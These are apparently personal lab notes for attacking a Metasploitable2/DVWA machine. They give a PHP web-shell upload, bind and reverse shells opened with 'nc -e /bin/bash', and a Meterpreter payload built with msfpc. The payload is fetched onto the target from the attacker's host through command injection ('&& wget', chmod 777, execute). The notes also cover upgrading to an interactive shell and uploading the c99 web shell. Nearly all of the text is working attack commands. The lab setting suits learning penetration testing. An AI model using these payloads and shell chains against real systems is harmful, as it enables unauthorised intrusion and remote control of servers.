---------------------------WEB shell(BIND SHELL)---------------------
WE have a metasploitabe2 machine in our local system and apache2 server is on.

nc IP_of_Target 80      //80 here is the port number we specify if any different port is hosting apache server

//now we get web shell 

//we can request home page like this
GET / HTTP /1.1         // (/) is for root page or home page using HTTP protocol version 1.1

//we will be going to our browser and on IP_of_target and going to dvwa
//reducing dvwa security to low

//now going to upload 

//now we will upload a php shell
----------------------------------------------
<?php echo shell_exec($_GET['cmd'].' 2>&1); ?>
----------------------------------------------     
//saving it as shell.php
//after uploadation we are provided with the path of uploaded shell
//so going to the path from browser
https://IP_of_target/dvwa/hackable/uploads/shell.php

//now to run the shell we have to do this
https://IP_of_target/dvwa/hackable/uploads/shell.php?cmd=ls
//ls <---we can add any command

//https://IP_of_target/dvwa/hackable/uploads/shell.php?cmd=nc -h
//to find out that netcat is install in target ip

//now we will make target to listen through netcat
https://IP_of_target/dvwa/hackable/uploads/shell.php?cmd=nc -l -e /bin/bash -p 1234

//now in kali machine we will connect to the port 1234 we just started listening on target machine

nc IP_of_Target 1234
//and we will have the [non_interactive] shell tada..
//to convert it to interactive shell go below

----------------------Reverse Shell-------------------------------
//now we will do a reverse shell form target machine 
//do the following in target browser which we did earlier but little differently
https://IP_of_target/dvwa/hackable/uploads/shell.php?cmd=nc -e /bin/bash IP_of_kali 1234        //1234 is port number

//now lets listen for the connection in our kali machine which will be made by target_IP when we run the command from browser
//in kali
nc -lp 1234
// this is better than above condition.

--------------------MetaSploit backdoor--------------------------
msfpc - msf venom payload creator
metsploit framework to create payload files

kali>msfpc -h
//here we got the syntax and we will do the following command acording the syntax

msfpc Linux IP_of_target 4444 MSF REVERSE TCP
//we have tcp protocol for communication
//no need for staged and stageless
//we will require reverse shell
//we will do the msf for meterpreter shell
//reverse shell on port 4444
//and type of the target is LINUX

//and we got the Linux meterpreter and the command to run 
//run the command
//now we are listening on port 4444
//now we will upload the payload on target machine and run it to get reverse shell

//go to dvwa in metasploitable2 machine and go in Command Execution
//we have ping command in the given field so we will add other commands with that as per our need.

//now we will setup webserver in our machine so that we can download that in target machine

cp linux-meterpreter-staged-reverse-tcp-4444.elf /var/www/html/backdoor.elf

service apache2 start

//now in web browser in pinging filed enter
kali_machine_IP && wget https://kali_machine_IP/backdoor.elf
//first we added our machine so that first it will ping us and second it will download the file which is hoster on our kali machine

//now list the downloaded file
kali_machine_IP && ls

//changing permission
kali_machine_IP && chmod 777 backdoor.elf

//seeing permission
kali_machine_IP && ls -al

//executing the backdoor
kali_machine_IP && ./backdoor.elf 

//now going  to meterpreter terminal we saw meterpreter session 1 opened 
//to interact with that session

sessions -i 1

//to get shell
shell

--------Interactice shell-----------
//from above we found that when we did nc reverse shell we got non interactive shell
//now we want it to convert it into interactice shell

//google interactive shell cheat sheet
link - by pentestmonkey

//it have cheats to get reverse shell form the programs
//we will use php to get reverse shell
//now we will check whether php is installed on target machine

php -h
//if it get output then hell yeah

//now we have to copy the command from the cheat sheet to get reverse shell and add some tweaks to that command
//change the port number to 4444 <-----which we will be listening on kali machine before we run the command on that target
//and change /bin/sh to /bin/bash
//start listening on kali
nc -lvnp 4444

//now on bind web shell of target machine which we already have
//run php command
and tada we will have interactive shell

-------------------------Other shell-----------------
//google : php webshells
link : Github JohnTroomy/php-webshells 

//lets use one form it c99
//save the file

//go to dvwa site
//go to upload 
//upload php shell name c99.php
//now we have given the path of it we just have to enter the path in that browser after the target IP to execute it
https://IP_of_target/dvwa/hackable/uploads/c99.php

----------------------------------------------------------
